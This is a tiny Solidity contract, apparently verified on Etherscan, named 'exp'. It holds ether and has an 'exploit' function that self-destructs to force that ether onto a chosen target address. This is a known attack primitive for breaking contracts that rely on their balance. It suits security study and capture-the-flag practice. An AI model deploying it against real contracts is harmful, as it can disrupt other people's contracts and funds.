/**
 *Submitted for verification at Etherscan.io on 2022-02-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.20;
contract exp {
function exp() public payable {}
function exploit(address _target) public {
selfdestruct(_target);
}
}